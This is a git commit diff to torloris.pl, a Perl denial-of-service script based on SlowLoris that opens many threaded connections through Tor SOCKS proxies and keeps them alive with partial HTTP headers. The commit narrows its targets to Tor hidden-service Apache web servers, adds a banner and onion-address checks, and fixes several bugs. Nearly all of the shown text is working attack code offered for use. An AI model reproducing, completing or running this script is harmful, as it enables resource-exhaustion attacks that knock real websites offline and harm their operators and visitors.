a27ac7eee3954ac6e070abee87c9199b451c0afb
Te Taipo <hokioi-security@protonmail.ch>
2016-04-06 20:42:29 +1200

    Update torloris.pl

--- torloris.pl
+++ torloris.pl
@@ -1,8 +1,10 @@
 #!/bin/perl
 
-##################TorLoris######################
+##################TorLoris For Onions######################
 # Based on the SlowLoris tool by Robert "RSnake" Hansen
-# http://ha.ckers.org/slowloris/
+# bit.ly/1R6TKDO (Defunct: http://ha.ckers.org/slowloris/)
+# Updated to work via Tor by RootSecks
+# Crudely adapted by @te_taipo to only attack Tor Hidden Service Apache webservers
 ######################
 
 ###########################Setup###########################
@@ -17,8 +19,39 @@ use threads;
 $SIG{'PIPE'} = 'IGNORE'; 
 ######################END OF SETUP###########################
 
+print <<EOTEXT;
+CCCCCCCCCCOOCCOOOOO888\@8\@8888OOOOCCOOO888888888\@\@\@\@\@\@\@\@\@8\@8\@\@\@\@888OOCooocccc::::
+CCCCCCCCCCCCCCCOO888\@888888OOOCCCOOOO888888888888\@88888\@\@\@\@\@\@\@888\@8OOCCoococc:::
+CCCCCCCCCCCCCCOO88\@\@888888OOOOOOOOOO8888888O88888888O8O8OOO8888\@88\@\@8OOCOOOCoc::
+CCCCooooooCCCO88\@\@8\@88\@888OOOOOOO88888888888OOOOOOOOOOCCCCCOOOO888\@8888OOOCc::::
+CooCoCoooCCCO8\@88\@8888888OOO888888888888888888OOOOCCCooooooooCCOOO8888888Cocooc:
+ooooooCoCCC88\@88888\@888OO8888888888888888O8O8888OOCCCooooccccccCOOOO88\@888OCoccc
+ooooCCOO8O888888888\@88O8OO88888OO888O8888OOOO88888OCocoococ::ccooCOO8O888888Cooo
+oCCCCCCO8OOOCCCOO88\@88OOOOOO8888O888OOOOOCOO88888O8OOOCooCocc:::coCOOO888888OOCC
+oCCCCCOOO88OCooCO88\@8OOOOOO88O888888OOCCCCoCOOO8888OOOOOOOCoc::::coCOOOO888O88OC
+oCCCCOO88OOCCCCOO8\@\@8OOCOOOOO8888888OoocccccoCO8O8OO88OOOOOCc.:ccooCCOOOO88888OO
+CCCOOOO88OOCCOOO8\@888OOCCoooCOO8888Ooc::...::coOO88888O888OOo:cocooCCCCOOOOOO88O
+CCCOO88888OOCOO8\@\@888OCcc:::cCOO888Oc..... ....cCOOOOOOOOOOOc.:cooooCCCOOOOOOOOO
+OOOOOO88888OOOO8\@8\@8Ooc:.:...cOO8O88c.      .  .coOOO888OOOOCoooooccoCOOOOOCOOOO
+OOOOO888\@8\@88888888Oo:. .  ...cO888Oc..          :oOOOOOOOOOCCoocooCoCoCOOOOOOOO
+COOO888\@88888888888Oo:.       .O8888C:  .oCOo.  ...cCCCOOOoooooocccooooooooCCCOO
+CCCCOO888888O888888Oo. .o8Oo. .cO88Oo:       :. .:..ccoCCCooCooccooccccoooooCCCC
+coooCCO8\@88OO8O888Oo:::... ..  :cO8Oc. . .....  :.  .:ccCoooooccoooocccccooooCCC
+:ccooooCO888OOOO8OOc..:...::. .co8\@8Coc::..  ....  ..:cooCooooccccc::::ccooCCooC
+.:::coocccoO8OOOOOOC:..::....coCO8\@8OOCCOc:...  ....:ccoooocccc:::::::::cooooooC
+....::::ccccoCCOOOOOCc......:oCO8\@8\@88OCCCoccccc::c::.:oCcc:::cccc:..::::coooooo
+.......::::::::cCCCCCCoocc:cO888\@8888OOOOCOOOCoocc::.:cocc::cc:::...:::coocccccc
+...........:::..:coCCCCCCCO88OOOO8OOOCCooCCCooccc::::ccc::::::.......:ccocccc:co
+.............::....:oCCoooooCOOCCOCCCoccococc:::::coc::::....... ...:::cccc:cooo
+ ..... ............. .coocoooCCoco:::ccccccc:::ccc::..........  ....:::cc::::coC
+   .  . ...    .... ..  .:cccoCooc:..  ::cccc:::c:.. ......... ......::::c:cccco
+  .  .. ... ..    .. ..   ..:...:cooc::cccccc:.....  .........  .....:::::ccoocc
+       .   .         .. ..::cccc:.::ccoocc:. ........... ..  . ..:::.:::::::ccco
+Welcome to Torloris For Onions
+EOTEXT
+
 # Server info and port info. 
-	my $server = shift || "127.0.0.1"; #Server IP address, using a URL may cause information leakage as the DNS query won't go through the socks proxy. 
+	my $server = shift || "somethingsomethingsome.onion"; # input a 22 char length Onion address 
 	my $protoport = "80"; #Port of web server to attack
 	my $sleeptimer; #A variable to hold a timer
 	my $threadcon = 50; #The amount of loops per thread/
@@ -31,19 +64,28 @@ $SIG{'PIPE'} = 'IGNORE';
 	my @socksver = ( "5", "5", "5", "5", "5", "5", "5", "5", "5" ); #Socks Version
 # End of server info and port info.
 
+# Make Torloris an onion attacker only!
+if ( ( length $server == 22 ) && ( substr($server, 16, 6) eq ".onion" ) ) {
+	$server =~ s/['\$','\#','\@','\~','\!','\&','\*','\(','\)','\[','\]','\;','\,','\.','\:','\?','\^',' ', '\`','\\','\/']//g;
+	substr($server, 16, 5) = "";
+} else {
+	die( "Must be an onion website URL!" );
+}
+
 #Randomize the first proxy to use for testing :)
-my $firstrandomnumber = int( rand(9));
+my $firstrandomnumber = int( rand(10));
 
 #Create connection to test delay
-if (my $sock = IO::Socket::Socks->new(ProxyAddr => $proxyaddress[$firstrandomnumber],
-					ProxyPort => $proxyportnums[$firstrandomnumber],
-					ConnectAddr => $server,
-					ConnectPort => $protoport,
-					SocksVersion => $socksver[$firstrandomnumber],
-					Timeout => $socktimeout) or die $SOCKS_ERROR ) {
+print "Trying random Tor port: " . $proxyportnums[$firstrandomnumber] . " (if fail, try again).\r\n";
+if ( my $sock = IO::Socket::Socks->new(ProxyAddr => $proxyaddress[$firstrandomnumber],
+				       ProxyPort => $proxyportnums[$firstrandomnumber],
+				       ConnectAddr => $server . '.onion',
+				       ConnectPort => $protoport,
+				       SocksVersion => $socksver[$firstrandomnumber],
+				       Timeout => $socktimeout) or die $SOCKS_ERROR ) {
 
 	##If the connection works wee generate a http header with some junk as a get but miss the last new line and carridge return chars
-	my $httprequest =" GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: $server\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
+	my $httprequest =" GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: " . $server . ".onion\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
 	
 	##If we can send the header down the sock we created earlier
 	if (print $sock $httprequest) {
@@ -87,7 +129,7 @@ if (my $sock = IO::Socket::Socks->new(ProxyAddr => $proxyaddress[$firstrandomnum
 				
 	}
 	
-	print "Will connect to $server on port $protoport every with a $sleeptimer timer on each socket\r\n";
+	print "Will connect to $server.onion on port $protoport with a $sleeptimer second timer on each socket\r\n";
 	
 } else {
 	
@@ -144,12 +186,15 @@ if ($doesitwork == 1) {
 				$proxycounter =8;
 				$torinstance = 8;
 		} elsif ($torinstance == 8) {
+				$proxycounter =9;
+				$torinstance = 9;
+		} elsif ($torinstance == 9) {
 				$proxycounter =0;
 				$torinstance = 0;
 		}
 				
 		#create a new thread for a connection loop that has all the relevent information
-		$threads[$inum] = threads->create(\&connectionsub, $threadcon, $server, $protoport,$socktimeout, 'tcp', $sleeptimer, $proxyportnums[$proxycounter], $proxyaddress[$proxycounter], $socksver[$proxycounter], $threadnumbervar );
+		$threads[$inum] = threads->create(\&connectionsub, $threadcon, $server . '.onion', $protoport,$socktimeout, 'tcp', $sleeptimer, $proxyportnums[$proxycounter], $proxyaddress[$proxycounter], $socksver[$proxycounter], $threadnumbervar );
 		#Thread online :)
 		print "Thread $threadnumbervar ONLINE\r\n";
 		#Add the threadcon value to the inum counter
@@ -158,11 +203,11 @@ if ($doesitwork == 1) {
 		
 	}
 	
-	#Get all the threads into an array
+	# Get all the threads into an array
 	my @letussee = threads->list;
-		#While the number of threads is greater than 0
+	# While the number of threads is greater than 0
 	while ($#letussee > 0) {
-		
+
 	}
 	print "Threads all dead :( \r\n";
 	
@@ -179,7 +224,6 @@ sub connectionsub {
 	my ($connum, $threadserver, $threadport, $threadtimeout, $threadproto, $threaddelaytime, $proxport, $proxaddr, $threadsockver, $threadconnumber) = @_;
 	my @threadsock;
 	my @threadworking;
-	my @threadsock;
 	my $xnum;
 
 	#while always
@@ -198,7 +242,7 @@ sub connectionsub {
 										Timeout => $threadtimeout ))
 			{
 				#Generate a request header
-				my $threadrequest = " GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: $server\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
+				my $threadrequest = " GET / " . int( rand(99999999999999) ) . " HTTP/1.1\r\n Host: " . $server . ".onion\r\n User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\nContent-Length: 42\r\n\ ";
 				
 				#Put the sock in a filehandle
 				my $threadhandle = $threadsock[$xnum];
@@ -216,45 +260,45 @@ sub connectionsub {
 						} else {
 							
 							$threadworking[$xnum] = 1;
-							
+
 						}
-						
+
 				}
-				
+
 			} else {
 				
 				$threadworking[$xnum] = 0;
 			}
-		
+
 		}
-		
+
 		for my $znum (1 .. $connum) {
 			if ($threadworking[$znum] == 1) {
 				if ($threadsock[$znum]) {
-					
+
 					my $threadhandle = $threadsock[$znum];
-					
+
 					if (print $threadhandle "X-a: b\r\n") {
-						
+
 						$threadworking[$znum] = 1;
-						
+
 					} else {
-						
+
 						$threadworking[$znum] = 0;
-						
+
 					}
-						
+
 				} else {
-					
-					$threadworking[$znum] - 0;
-					
+
+					$threadworking[$znum] = 0;
+
 				}
 			}
-			
+
 		}
-		
+
 		sleep($threaddelaytime);
-		
+
 	}
-	
+
 }
